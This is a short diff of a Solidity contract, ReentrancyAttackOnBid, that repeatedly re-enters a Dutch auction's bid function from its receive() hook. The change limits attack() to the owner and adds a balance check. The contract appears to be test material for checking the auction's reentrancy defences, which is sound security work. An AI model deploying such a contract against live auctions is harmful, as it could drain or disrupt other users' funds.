@@ -12,12 +12,14 @@ contract ReentrancyAttackOnBid is Ownable {
         dutchAuction = IDutchAuction(_dutchAuctionAddress);
     }
 
-    function attack() external payable {
+    function attack() external onlyOwner payable {
         attackAmount = msg.value;
         dutchAuction.bid{value: msg.value}();
     }
 
     receive() external payable {
-        dutchAuction.bid{value: attackAmount}();
+        if (address(this).balance >= attackAmount) {
+            dutchAuction.bid{value: attackAmount}();
+        }
     }
 }
